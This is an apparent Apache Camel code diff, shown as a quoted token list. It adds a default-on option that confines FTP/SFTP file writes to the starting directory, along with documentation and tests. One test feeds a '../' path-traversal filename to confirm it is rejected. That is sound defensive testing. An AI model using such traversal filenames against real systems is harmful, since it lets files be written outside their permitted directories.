"information", "is", "only", "possible", "to", "retrieve", "when", "LIST", "command", "is", "in", "use", ".", "|", "true", "|", "boolean", "|", "*", "fileExist", "*", "(", "producer", ")", "|", "What", "to", "do", "if", "a", "file", "already", "exists", "with", "the", "same", "name", ".", "Override", ",", "which", "is", "the", "default", ",", "replaces", "the", "existing", "file", ".", "Append", "-", "adds", "content", "to", "the", "existing", "file", ".", "Fail", "-", "throws", "a", "GenericFileOperationException", ",", "indicating", "that", "there", "is", "already", "an", "existing", "file", ".", "Ignore", "-", "silently", "ignores", "the", "problem", "and", "does", "not", "override", "the", "existing", "file", ",", "but", "assumes", "everything", "is", "okay", ".", "Move", "-", "option", "requires", "to", "use", "the", "moveExisting", "option", "to", "be", "configured", "as", "well", ".", "The", "option", "eagerDeleteTargetFile", "can", "be", "used", "to", "control", "what", "to", "do", "if", "an", "moving", "the", "file", ",", "and", "there", "exists", "already", "an", "existing", "file", ",", "otherwise", "causing", "the", "move", "operation", "to", "fail", ".", "The", "Move", "option", "will", "move", "any", "existing", "files", ",", "before", "writing", "the", "target", "file", ".", "TryRename", "is", "only", "applicable", "if", "tempFileName", "option", "is", "in", "use", ".", "This", "allows", "to", "try", "renaming", "the", "file", "from", "the", "temporary", "name", "to", "the", "actual", "name", ",", "without", "doing", "any", "exists", "check", ".", "This", "check", "may", "be", "faster", "on", "some", "file", "systems", "and", "especially", "FTP", "servers", ".", "|", "Override", "|", "GenericFileExist", "|", "*", "flatten", "*", "(", "producer", ")", "|", "Flatten", "is", "used", "to", "flatten", "the", "file", "name", "path", "to", "strip", "any", "leading", "paths", ",", "so", "it", "'", "s", "just", "the", "file", "name", ".", "This", "allows", "you", "to", "consume", "recursively", "into", "sub", "-", "directories", ",", "but", "when", "you", "eg", "write", "the", "files", "to", "another", "directory", "they", "will", "be", "written", "in", "a", "single", "directory", ".", "Setting", "this", "to", "true", "on", "the", "producer", "enforces", "that", "any", "file", "name", "in", "CamelFileName", "header", "will", "be", "stripped", "for", "any", "leading", "paths", ".", "|", "false", "|", "boolean", "|", "*", "jailStartingDirectory", "*", "(", "producer", ")", "|", "Used", "for", "jailing", "(", "restricting", ")", "writing", "files", "to", "the", "starting", "directory", "(", "and", "sub", ")", "only", ".", "This", "is", "enabled", "by", "default", "to", "not", "allow", "Camel", "to", "write", "files", "to", "outside", "directories", "(", "to", "be", "more", "secured", "out", "of", "the", "box", ")", ".", "You", "can", "turn", "this", "off", "to", "allow", "writing", "files", "to", "directories", "outside", "the", "starting", "directory", ",", "such", "as", "parent", "or", "root", "folders", ".", "|", "true", "|", "boolean", "|", "*", "moveExisting", "*", "(", "producer", ")", "|", "Expression", "(", "such", "as", "File", "Language", ")", "used", "to", "compute", "file", "name", "to", "use", "when", "fileExist", "=", "Move", "is", "configured", ".", "To", "move", "files", "into", "a", "backup", "subdirectory", "just", "enter", "backup", ".", "This", "option", "only", "supports", "the", "following", "File", "Language", "tokens", ":", "file", ":", "name", ",", "file", ":", "name", ".", "ext", ",", "file", ":", "name", ".", "noext", ",", "file", ":", "onlyname", ",", "file", ":", "onlyname", ".", "noext", ",", "file", ":", "ext", ",", "and", "file", ":", "parent", ".", "Notice", "the", "file", ":", "parent", "is", "not", "supported", "by", "the", "FTP", "component", ",", "as", "the", "FTP", "component", "can", "only", "move", "any", "existing", "files", "to", "a", "relative", "directory", "based", "on", "current", "dir", "as", "base", ".", "|", "|", "String", "|", "*", "tempFileName", "*", "(", "producer", ")", "|", "The", "same", "as", "tempPrefix", "option", "but", "offering", "a", "more", "fine", "grained", "control", "on", "the", "naming", "of", "the", "temporary", "filename", "as", "it", "uses", "the", "File", "Language", ".", "|", "|", "String", "|", "*", "tempPrefix", "*", "(", "producer", ")", "|", "This", "option", "is", "used", "to", "write", "the", "file", "using", "a", "temporary", "name", "and", "then", ",", "after", "the", "write", "is", "complete", ",", "rename", "it", "to", "the", "real", "name", ".", "Can", "be", "used", "to", "identify", "files", "being", "written", "and", "also", "avoid", "consumers", "(", "not", "using", "exclusive", "read", "locks", ")", "reading", "in", "progress", "files", ".", "Is", "often", "used", "by", "FTP", "when", "uploading", "big", "files", ".", "|", "|", "String", "@", "@", "-", "85", ",", "7", "+", "85", ",", "7", "@", "@", "public", "void", "testProducerDateByExpression", "(", ")", "throws", "Exception", "{", "@", "Test", "public", "void", "testProducerComplexByExpression", "(", ")", "throws", "Exception", "{", "/", "/", "need", "one", "extra", "subdirectory", "(", "=", "foo", ")", "to", "be", "able", "to", "start", "with", ".", ".", "in", "the", "fileName", "option", "String", "url", "=", "\"", "ftp", ":", "//", "admin", "@", "localhost", ":", "\"", "+", "getPort", "(", ")", "+", "\"", "/", "filelanguage", "/", "foo", "?", "password", "=", "admin", "\"", ";", "String", "url", "=", "\"", "ftp", ":", "//", "admin", "@", "localhost", ":", "\"", "+", "getPort", "(", ")", "+", "\"", "/", "filelanguage", "/", "foo", "?", "password", "=", "admin", "&", "jailStartingDirectory", "=", "false", "\"", ";", "String", "expression", "=", "\"", "..", "/", "filelanguageinbox", "/", "myfile", "-", "${", "bean", ":", "myguidgenerator", ".", "guid", "}", "-$", "{", "date", ":", "now", ":", "yyyyMMdd", "}", ".", "txt", "\"", ";", "template", ".", "sendBody", "(", "url", "+", "\"", "&", "fileName", "=", "\"", "+", "expression", ",", "\"", "Hello", "World", "\"", ");", "@", "@", "-", "0", ",", "0", "+", "1", ",", "68", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "file", ".", "remote", ";", "import", "org", ".", "apache", ".", "camel", ".", "Exchange", ";", "import", "org", ".", "apache", ".", "camel", ".", "builder", ".", "RouteBuilder", ";", "import", "org", ".", "apache", ".", "camel", ".", "component", ".", "mock", ".", "MockEndpoint", ";", "import", "org", ".", "junit", ".", "Test", ";", "public", "class", "FtpProducerJailStartingDirectoryTest", "extends", "FtpServerTestSupport", "{", "private", "String", "getFtpUrl", "(", ")", "{", "return", "\"", "ftp", ":", "//", "admin", "@", "localhost", ":", "\"", "+", "getPort", "(", ")", "+", "\"", "/", "upload", "/", "jail", "?", "binary", "=", "false", "&", "password", "=", "admin", "&", "tempPrefix", "=", ".", "uploading", "\"", ";", "}", "@", "Test", "public", "void", "testWriteOutsideStartingDirectory", "(", ")", "throws", "Exception", "{", "MockEndpoint", "mock", "=", "getMockEndpoint", "(", "\"", "mock", ":", "result", "\"", ");", "mock", ".", "expectedMessageCount", "(", "0", ")", ";", "try", "{", "template", ".", "sendBodyAndHeader", "(", "\"", "direct", ":", "start", "\"", ",", "\"", "Hello", "World", "\"", ",", "Exchange", ".", "FILE_NAME", ",", "\"", "hello", ".", "txt", "\"", ");", "fail", "(", "\"", "Should", "have", "thrown", "exception", "\"", ");", "}", "catch", "(", "Exception", "e", ")", "{", "IllegalArgumentException", "iae", "=", "assertIsInstanceOf", "(", "IllegalArgumentException", ".", "class", ",", "e", ".", "getCause", "(", "))", ";", "assertTrue", "(", "iae", ".", "getMessage", "(", ").", "contains", "(", "\"", "as", "the", "filename", "is", "jailed", "to", "the", "starting", "directory", "\"", "))", ";", "}", "assertMockEndpointsSatisfied", "(", ");", "}", "@", "Test", "public", "void", "testWriteInsideStartingDirectory", "(", ")", "throws", "Exception", "{", "MockEndpoint", "mock", "=", "getMockEndpoint", "(", "\"", "mock", ":", "result", "\"", ");", "mock", ".", "expectedMessageCount", "(", "1", ")", ";", "template", ".", "sendBodyAndHeader", "(", "\"", "direct", ":", "start", "\"", ",", "\"", "Bye", "World", "\"", ",", "Exchange", ".", "FILE_NAME", ",", "\"", "jail", "/", "bye", ".", "txt", "\"", ");", "assertMockEndpointsSatisfied", "(", ");", "}", "@", "Override", "protected", "RouteBuilder", "createRouteBuilder", "(", ")", "throws", "Exception", "{", "return", "new", "RouteBuilder", "(", ")", "{", "@", "Override", "public", "void", "configure", "(", ")", "throws", "Exception", "{", "from", "(", "\"", "direct", ":", "start", "\"", ")", ".", "setHeader", "(", "Exchange", ".", "FILE_NAME", ",", "simple", "(", "\".", "./", "${", "file", ":", "name", "}", "\")", ")", ".", "to", "(", "getFtpUrl", "(", "))", ".", "to", "(", "\"", "mock", ":", "result", "\"", ");", "}", "}", ";", "}", "}", "\\", "No", "newline", "at", "end", "of", "file", "@", "@", "-", "83", ",", "7", "+", "83", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "==", "=", "=", "==", "=", "Query", "Parameters", "(", "21", "parameters", ")", ":", "=", "==", "=", "Query", "Parameters", "(", "22", "parameters", ")", ":", "[", "width", "=", "\"", "100", "%", "\",", "cols", "=", "\"", "2", ",", "5", ",", "^", "1", ",", "2", "\"", ",", "options", "=", "\"", "header", "\"", "]", "@", "@", "-", "93", ",", "6", "+", "93", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "*", "chmod", "*", "(", "producer", ")", "|", "Allows", "you", "to", "set", "chmod", "on", "the", "stored", "file", ".", "For", "example", "chmod", "=", "664", ".", "|", "664", "|", "String", "|", "*", "fileName", "*", "(", "producer", ")", "|", "Use", "Expression", "such", "as", "File", "Language", "to", "dynamically", "set", "the", "filename", ".", "For", "consumers", ",", "it", "'", "s", "used", "as", "a", "filename", "filter", ".", "For", "producers", ",", "it", "'", "s", "used", "to", "evaluate", "the", "filename", "to", "write", ".", "If", "an", "expression", "is", "set", ",", "it", "take", "precedence", "over", "the", "CamelFileName", "header", ".", "(", "Note", ":", "The", "header", "itself", "can", "also", "be", "an", "Expression", ")", ".", "The", "expression", "options", "support", "both", "String", "and", "Expression", "types", ".", "If", "the", "expression", "is", "a", "String", "type", ",", "it", "is", "always", "evaluated", "using", "the", "File", "Language", ".", "If", "the", "expression", "is", "an", "Expression", "type", ",", "the", "specified", "Expression", "type", "is", "used", "-", "this", "allows", "you", ",", "for", "instance", ",", "to", "use", "OGNL", "expressions", ".", "For", "the", "consumer", ",", "you", "can", "use", "it", "to", "filter", "filenames", ",", "so", "you", "can", "for", "instance", "consume", "today", "'", "s", "file", "using", "the", "File", "Language", "syntax", ":", "mydata", "-", "$", "date", ":", "now", ":", "yyyyMMdd", ".", "txt", ".", "The", "producers", "support", "the", "CamelOverruleFileName", "header", "which", "takes", "precedence", "over", "any", "existing", "CamelFileName", "header", ";", "the", "CamelOverruleFileName", "is", "a", "header", "that", "is", "used", "only", "once", ",", "and", "makes", "it", "easier", "as", "this", "avoids", "to", "temporary", "store", "CamelFileName", "and", "have", "to", "restore", "it", "afterwards", ".", "|", "|", "String", "|", "*", "flatten", "*", "(", "producer", ")", "|", "Flatten", "is", "used", "to", "flatten", "the", "file", "name", "path", "to", "strip", "any", "leading", "paths", ",", "so", "it", "'", "s", "just", "the", "file", "name", ".", "This", "allows", "you", "to", "consume", "recursively", "into", "sub", "-", "directories", ",", "but", "when", "you", "eg", "write", "the", "files", "to", "another", "directory", "they", "will", "be", "written", "in", "a", "single", "directory", ".", "Setting", "this", "to", "true", "on", "the", "producer", "enforces", "that", "any", "file", "name", "in", "CamelFileName", "header", "will", "be", "stripped", "for", "any", "leading", "paths", ".", "|", "false", "|", "boolean", "|", "*", "jailStartingDirectory", "*", "(", "producer", ")", "|", "Used", "for", "jailing", "(", "restricting", ")", "writing", "files", "to", "the", "starting", "directory", "(", "and", "sub", ")", "only", ".", "This", "is", "enabled", "by", "default", "to", "not", "allow", "Camel", "to", "write", "files", "to", "outside", "directories", "(", "to", "be", "more", "secured", "out", "of", "the", "box", ")", ".", "You", "can", "turn", "this", "off", "to", "allow", "writing", "files", "to", "directories", "outside", "the", "starting", "directory", ",", "such", "as", "parent", "or", "root", "folders", ".", "|", "true", "|", "boolean", "|", "*", "strictHostKeyChecking", "*", "(", "producer", ")", "|", "Sets", "whether", "to", "use", "strict", "host", "key", "checking", ".", "Possible", "values", "are", ":", "no", ",", "yes", "|", "no", "|", "String", "|", "*", "allowNullBody", "*", "(", "producer", ")", "|", "Used", "to", "specify", "if", "a", "null", "body", "is", "allowed", "during", "file", "writing", ".", "If", "set", "to", "true", "then", "an", "empty", "file", "will", "be", "created", ",", "when", "set", "to", "false", ",", "and", "attempting", "to", "send", "a", "null", "body", "to", "the", "file", "component", ",", "a", "GenericFileWriteException", "of", "'", "Cannot", "write", "null", "body", "to", "file", ".", "'", "will", "be", "thrown", ".", "If", "the", "fileExist", "option", "is", "set", "to", "'", "Override", "'", ",", "then", "the", "file", "will", "be", "truncated", ",", "and", "if", "set", "to", "append", "the", "file", "will", "remain", "unchanged", ".", "|", "false", "|", "boolean", "|", "*", "disconnectOnBatchComplete", "*", "(", "producer", ")", "|", "Whether", "or", "not", "to", "disconnect", "from", "remote", "FTP", "server", "right", "after", "a", "Batch", "upload", "is", "complete", ".", "disconnectOnBatchComplete", "will", "only", "disconnect", "the", "current", "connection", "to", "the", "FTP", "server", ".", "|", "false", "|", "boolean", "@", "@", "-", "100", ",", "7", "+", "100", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "==", "=", "=", "==", "=", "Query", "Parameters", "(", "109", "parameters", ")", ":", "=", "==", "=", "Query", "Parameters", "(", "110", "parameters", ")", ":", "[", "width", "=", "\"", "100", "%", "\",", "cols", "=", "\"", "2", ",", "5", ",", "^", "1", ",", "2", "\"", ",", "options", "=", "\"", "header", "\"", "]", "@", "@", "-", "143", ",", "6", "+", "143", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "*", "useList", "*", "(", "consumer", ")", "|", "Whether", "to", "allow", "using", "LIST", "command", "when", "downloading", "a", "file", ".", "Default", "is", "true", ".", "In", "some", "use", "cases", "you", "may", "want", "to", "download", "a", "specific", "file", "and", "are", "not", "allowed", "to", "use", "the", "LIST", "command", ",", "and", "therefore", "you", "can", "set", "this", "option", "to", "false", ".", "Notice", "when", "using", "this", "option", ",", "then", "the", "specific", "file", "to", "download", "does", "not", "include", "meta", "-", "data", "information", "such", "as", "file", "size", ",", "timestamp", ",", "permissions", "etc", ",", "because", "those", "information", "is", "only", "possible", "to", "retrieve", "when", "LIST", "command", "is", "in", "use", ".", "|", "true", "|", "boolean", "|", "*", "fileExist", "*", "(", "producer", ")", "|", "What", "to", "do", "if", "a", "file", "already", "exists", "with", "the", "same", "name", ".", "Override", ",", "which", "is", "the", "default", ",", "replaces", "the", "existing", "file", ".", "Append", "-", "adds", "content", "to", "the", "existing", "file", ".", "Fail", "-", "throws", "a", "GenericFileOperationException", ",", "indicating", "that", "there", "is", "already", "an", "existing", "file", ".", "Ignore", "-", "silently", "ignores", "the", "problem", "and", "does", "not", "override", "the", "existing", "file", ",", "but", "assumes", "everything", "is", "okay", ".", "Move", "-", "option", "requires", "to", "use", "the", "moveExisting", "option", "to", "be", "configured", "as", "well", ".", "The", "option", "eagerDeleteTargetFile", "can", "be", "used", "to", "control", "what", "to", "do", "if", "an", "moving", "the", "file", ",", "and", "there", "exists", "already", "an", "existing", "file", ",", "otherwise", "causing", "the", "move", "operation", "to", "fail", ".", "The", "Move", "option", "will", "move", "any", "existing", "files", ",", "before", "writing", "the", "target", "file", ".", "TryRename", "is", "only", "applicable", "if", "tempFileName", "option", "is", "in", "use", ".", "This", "allows", "to", "try", "renaming", "the", "file", "from", "the", "temporary", "name", "to", "the", "actual", "name", ",", "without", "doing", "any", "exists", "check", ".", "This", "check", "may", "be", "faster", "on", "some", "file", "systems", "and", "especially", "FTP", "servers", ".", "|", "Override", "|", "GenericFileExist", "|", "*", "flatten", "*", "(", "producer", ")", "|", "Flatten", "is", "used", "to", "flatten", "the", "file", "name", "path", "to", "strip", "any", "leading", "paths", ",", "so", "it", "'", "s", "just", "the", "file", "name", ".", "This", "allows", "you", "to", "consume", "recursively", "into", "sub", "-", "directories", ",", "but", "when", "you", "eg", "write", "the", "files", "to", "another", "directory", "they", "will", "be", "written", "in", "a", "single", "directory", ".", "Setting", "this", "to", "true", "on", "the", "producer", "enforces", "that", "any", "file", "name", "in", "CamelFileName", "header", "will", "be", "stripped", "for", "any", "leading", "paths", ".", "|", "false", "|", "boolean", "|", "*", "jailStartingDirectory", "*", "(", "producer", ")", "|", "Used", "for", "jailing", "(", "restricting", ")", "writing", "files", "to", "the", "starting", "directory", "(", "and", "sub", ")", "only", ".", "This", "is", "enabled", "by", "default", "to", "not", "allow", "Camel", "to", "write", "files", "to", "outside", "directories", "(", "to", "be", "more", "secured", "out", "of", "the", "box", ")", ".", "You", "can", "turn", "this", "off", "to", "allow", "writing", "files", "to", "directories", "outside", "the", "starting", "directory", ",", "such", "as", "parent", "or", "root", "folders", ".", "|", "true", "|", "boolean", "|", "*", "moveExisting", "*", "(", "producer", ")", "|", "Expression", "(", "such", "as", "File", "Language", ")", "used", "to", "compute", "file", "name", "to", "use", "when", "fileExist", "=", "Move", "is", "configured", ".", "To", "move", "files", "into", "a", "backup", "subdirectory", "just", "enter", "backup", ".", "This", "option", "only", "supports", "the", "following", "File", "Language", "tokens", ":", "file", ":", "name", ",", "file", ":", "name", ".", "ext", ",", "file", ":", "name", ".", "noext", ",", "file", ":", "onlyname", ",", "file", ":", "onlyname", ".", "noext", ",", "file", ":", "ext", ",", "and", "file", ":", "parent", ".", "Notice", "the", "file", ":", "parent", "is", "not", "supported", "by", "the", "FTP", "component", ",", "as", "the", "FTP", "component", "can", "only", "move", "any", "existing", "files", "to", "a", "relative", "directory", "based", "on", "current", "dir", "as", "base", ".", "|", "|", "String", "|", "*", "tempFileName", "*", "(", "producer", ")", "|", "The", "same", "as", "tempPrefix", "option", "but", "offering", "a", "more", "fine", "grained", "control", "on", "the", "naming", "of", "the", "temporary", "filename", "as", "it", "uses", "the", "File", "Language", ".", "|", "|", "String", "|", "*", "tempPrefix", "*", "(", "producer", ")", "|", "This", "option", "is", "used", "to", "write", "the", "file", "using", "a", "temporary", "name", "and", "then", ",", "after", "the", "write", "is", "complete", ",", "rename", "it", "to", "the", "real", "name", ".", "Can", "be", "used", "to", "identify", "files", "being", "written", "and", "also", "avoid", "consumers", "(", "not", "using", "exclusive", "read", "locks", ")", "reading", "in", "progress", "files", ".", "Is", "often", "used", "by", "FTP", "when", "uploading", "big", "files", ".", "|", "|", "String", "@", "@", "-", "60", ",", "7", "+", "60", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "==", "=", "=", "==", "=", "Query", "Parameters", "(", "121", "parameters", ")", ":", "=", "==", "=", "Query", "Parameters", "(", "122", "parameters", ")", ":", "[", "width", "=", "\"", "100", "%", "\",", "cols", "=", "\"", "2", ",", "5", ",", "^", "1", ",", "2", "\"", ",", "options", "=", "\"", "header", "\"", "]", "@", "@", "-", "103", ",", "6", "+", "103", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "*", "useList", "*", "(", "consumer", ")", "|", "Whether", "to", "allow", "using", "LIST", "command", "when", "downloading", "a", "file", ".", "Default", "is", "true", ".", "In", "some", "use", "cases", "you", "may", "want", "to", "download", "a", "specific", "file", "and", "are", "not", "allowed", "to", "use", "the", "LIST", "command", ",", "and", "therefore", "you", "can", "set", "this", "option", "to", "false", ".", "Notice", "when", "using", "this", "option", ",", "then", "the", "specific", "file", "to", "download", "does", "not", "include", "meta", "-", "data", "information", "such", "as", "file", "size", ",", "timestamp", ",", "permissions", "etc", ",", "because", "those", "information", "is", "only", "possible", "to", "retrieve", "when", "LIST", "command", "is", "in", "use", ".", "|", "true", "|", "boolean", "|", "*", "fileExist", "*", "(", "producer", ")", "|", "What", "to", "do", "if", "a", "file", "already", "exists", "with", "the", "same", "name", ".", "Override", ",", "which", "is", "the", "default", ",", "replaces", "the", "existing", "file", ".", "Append", "-", "adds", "content", "to", "the", "existing", "file", ".", "Fail", "-", "throws", "a", "GenericFileOperationException", ",", "indicating", "that", "there", "is", "already", "an", "existing", "file", ".", "Ignore", "-", "silently", "ignores", "the", "problem", "and", "does", "not", "override", "the", "existing", "file", ",", "but", "assumes", "everything", "is", "okay", ".", "Move", "-", "option", "requires", "to", "use", "the", "moveExisting", "option", "to", "be", "configured", "as", "well", ".", "The", "option", "eagerDeleteTargetFile", "can", "be", "used", "to", "control", "what", "to", "do", "if", "an", "moving", "the", "file", ",", "and", "there", "exists", "already", "an", "existing", "file", ",", "otherwise", "causing", "the", "move", "operation", "to", "fail", ".", "The", "Move", "option", "will", "move", "any", "existing", "files", ",", "before", "writing", "the", "target", "file", ".", "TryRename", "is", "only", "applicable", "if", "tempFileName", "option", "is", "in", "use", ".", "This", "allows", "to", "try", "renaming", "the", "file", "from", "the", "temporary", "name", "to", "the", "actual", "name", ",", "without", "doing", "any", "exists", "check", ".", "This", "check", "may", "be", "faster", "on", "some", "file", "systems", "and", "especially", "FTP", "servers", ".", "|", "Override", "|", "GenericFileExist", "|", "*", "flatten", "*", "(", "producer", ")", "|", "Flatten", "is", "used", "to", "flatten", "the", "file", "name", "path", "to", "strip", "any", "leading", "paths", ",", "so", "it", "'", "s", "just", "the", "file", "name", ".", "This", "allows", "you", "to", "consume", "recursively", "into", "sub", "-", "directories", ",", "but", "when", "you", "eg", "write", "the", "files", "to", "another", "directory", "they", "will", "be", "written", "in", "a", "single", "directory", ".", "Setting", "this", "to", "true", "on", "the", "producer", "enforces", "that", "any", "file", "name", "in", "CamelFileName", "header", "will", "be", "stripped", "for", "any", "leading", "paths", ".", "|", "false", "|", "boolean", "|", "*", "jailStartingDirectory", "*", "(", "producer", ")", "|", "Used", "for", "jailing", "(", "restricting", ")", "writing", "files", "to", "the", "starting", "directory", "(", "and", "sub", ")", "only", ".", "This", "is", "enabled", "by", "default", "to", "not", "allow", "Camel", "to", "write", "files", "to", "outside", "directories", "(", "to", "be", "more", "secured", "out", "of", "the", "box", ")", ".", "You", "can", "turn", "this", "off", "to", "allow", "writing", "files", "to", "directories", "outside", "the", "starting", "directory", ",", "such", "as", "parent", "or", "root", "folders", ".", "|", "true", "|", "boolean", "|", "*", "moveExisting", "*", "(", "producer", ")", "|", "Expression", "(", "such", "as", "File", "Language", ")", "used", "to", "compute", "file", "name", "to", "use", "when", "fileExist", "=", "Move", "is", "configured", ".", "To", "move", "files", "into", "a", "backup", "subdirectory", "just", "enter", "backup", ".", "This", "option", "only", "supports", "the", "following", "File", "Language", "tokens", ":", "file", ":", "name", ",", "file", ":", "name", ".", "ext", ",", "file", ":", "name", ".", "noext", ",", "file", ":", "onlyname", ",", "file", ":", "onlyname", ".", "noext", ",", "file", ":", "ext", ",", "and", "file", ":", "parent", ".", "Notice", "the", "file", ":", "parent", "is", "not", "supported", "by", "the", "FTP", "component", ",", "as", "the", "FTP", "component", "can", "only", "move", "any", "existing", "files", "to", "a", "relative", "directory", "based", "on", "current", "dir", "as", "base", ".", "|", "|", "String", "|", "*", "tempFileName", "*", "(", "producer", ")", "|", "The", "same", "as", "tempPrefix", "option", "but", "offering", "a", "more", "fine", "grained", "control", "on", "the", "naming", "of", "the", "temporary", "filename", "as", "it", "uses", "the", "File", "Language", ".", "|", "|", "String", "|", "*", "tempPrefix", "*", "(", "producer", ")", "|", "This", "option", "is", "used", "to", "write", "the", "file", "using", "a", "temporary", "name", "and", "then", ",", "after", "the", "write", "is", "complete", ",", "rename", "it", "to", "the", "real", "name", ".", "Can", "be", "used", "to", "identify", "files", "being", "written", "and", "also", "avoid", "consumers", "(", "not", "using", "exclusive", "read", "locks", ")", "reading", "in", "progress", "files", ".", "Is", "often", "used", "by", "FTP", "when", "uploading", "big", "files", ".", "|", "|", "String", "@", "@", "-", "83", ",", "7", "+", "83", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "==", "=", "=", "==", "=", "Query", "Parameters", "(", "21", "parameters", ")", ":", "=", "==", "=", "Query", "Parameters", "(", "22", "parameters", ")", ":", "[", "width", "=", "\"", "100", "%", "\",", "cols", "=", "\"", "2", ",", "5", ",", "^", "1", ",", "2", "\"", ",", "options", "=", "\"", "header", "\"", "]", "@", "@", "-", "93", ",", "6", "+", "93", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "*", "chmod", "*", "(", "producer", ")", "|", "Allows", "you", "to", "set", "chmod", "on", "the", "stored", "file", ".", "For", "example", "chmod", "=", "664", ".", "|", "664", "|", "String", "|", "*", "fileName", "*", "(", "producer", ")", "|", "Use", "Expression", "such", "as", "File", "Language", "to", "dynamically", "set", "the", "filename", ".", "For", "consumers", ",", "it", "'", "s", "used", "as", "a", "filename", "filter", ".", "For", "producers", ",", "it", "'", "s", "used", "to", "evaluate", "the", "filename", "to", "write", ".", "If", "an", "expression", "is", "set", ",", "it", "take", "precedence", "over", "the", "CamelFileName", "header", ".", "(", "Note", ":", "The", "header", "itself", "can", "also", "be", "an", "Expression", ")", ".", "The", "expression", "options", "support", "both", "String", "and", "Expression", "types", ".", "If", "the", "expression", "is", "a", "String", "type", ",", "it", "is", "always", "evaluated", "using", "the", "File", "Language", ".", "If", "the", "expression", "is", "an", "Expression", "type", ",", "the", "specified", "Expression", "type", "is", "used", "-", "this", "allows", "you", ",", "for", "instance", ",", "to", "use", "OGNL", "expressions", ".", "For", "the", "consumer", ",", "you", "can", "use", "it", "to", "filter", "filenames", ",", "so", "you", "can", "for", "instance", "consume", "today", "'", "s", "file", "using", "the", "File", "Language", "syntax", ":", "mydata", "-", "$", "date", ":", "now", ":", "yyyyMMdd", ".", "txt", ".", "The", "producers", "support", "the", "CamelOverruleFileName", "header", "which", "takes", "precedence", "over", "any", "existing", "CamelFileName", "header", ";", "the", "CamelOverruleFileName", "is", "a", "header", "that", "is", "used", "only", "once", ",", "and", "makes", "it", "easier", "as", "this", "avoids", "to", "temporary", "store", "CamelFileName", "and", "have", "to", "restore", "it", "afterwards", ".", "|", "|", "String", "|", "*", "flatten", "*", "(", "producer", ")", "|", "Flatten", "is", "used", "to", "flatten", "the", "file", "name", "path", "to", "strip", "any", "leading", "paths", ",", "so", "it", "'", "s", "just", "the", "file", "name", ".", "This", "allows", "you", "to", "consume", "recursively", "into", "sub", "-", "directories", ",", "but", "when", "you", "eg", "write", "the", "files", "to", "another", "directory", "they", "will", "be", "written", "in", "a", "single", "directory", ".", "Setting", "this", "to", "true", "on", "the", "producer", "enforces", "that", "any", "file", "name", "in", "CamelFileName", "header", "will", "be", "stripped", "for", "any", "leading", "paths", ".", "|", "false", "|", "boolean", "|", "*", "jailStartingDirectory", "*", "(", "producer", ")", "|", "Used", "for", "jailing", "(", "restricting", ")", "writing", "files", "to", "the", "starting", "directory", "(", "and", "sub", ")", "only", ".", "This", "is", "enabled", "by", "default", "to", "not", "allow", "Camel", "to", "write", "files", "to", "outside", "directories", "(", "to", "be", "more", "secured", "out", "of", "the", "box", ")", ".", "You", "can", "turn", "this", "off", "to", "allow", "writing", "files", "to", "directories", "outside", "the", "starting", "directory", ",", "such", "as", "parent", "or", "root", "folders", ".", "|", "true", "|", "boolean", "|", "*", "strictHostKeyChecking", "*", "(", "producer", ")", "|", "Sets", "whether", "to", "use", "strict", "host", "key", "checking", ".", "Possible", "values", "are", ":", "no", ",", "yes", "|", "no", "|", "String", "|", "*", "allowNullBody", "*", "(", "producer", ")", "|", "Used", "to", "specify", "if", "a", "null", "body", "is", "allowed", "during", "file", "writing", ".", "If", "set", "to", "true", "then", "an", "empty", "file", "will", "be", "created", ",", "when", "set", "to", "false", ",", "and", "attempting", "to", "send", "a", "null", "body", "to", "the", "file", "component", ",", "a", "GenericFileWriteException", "of", "'", "Cannot", "write", "null", "body", "to", "file", ".", "'", "will", "be", "thrown", ".", "If", "the", "fileExist", "option", "is", "set", "to", "'", "Override", "'", ",", "then", "the", "file", "will", "be", "truncated", ",", "and", "if", "set", "to", "append", "the", "file", "will", "remain", "unchanged", ".", "|", "false", "|", "boolean", "|", "*", "disconnectOnBatchComplete", "*", "(", "producer", ")", "|", "Whether", "or", "not", "to", "disconnect", "from", "remote", "FTP", "server", "right", "after", "a", "Batch", "upload", "is", "complete", ".", "disconnectOnBatchComplete", "will", "only", "disconnect", "the", "current", "connection", "to", "the", "FTP", "server", ".", "|", "false", "|", "boolean", "@", "@", "-", "51", ",", "7", "+", "51", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "==", "=", "=", "==", "=", "Query", "Parameters", "(", "117", "parameters", ")", ":", "=", "==", "=", "Query", "Parameters", "(", "118", "parameters", ")", ":", "[", "width", "=", "\"", "100", "%", "\",", "cols", "=", "\"", "2", ",", "5", ",", "^", "1", ",", "2", "\"", ",", "options", "=", "\"", "header", "\"", "]", "@", "@", "-", "87", ",", "6", "+", "87", ",", "7", "@", "@", "with", "the", 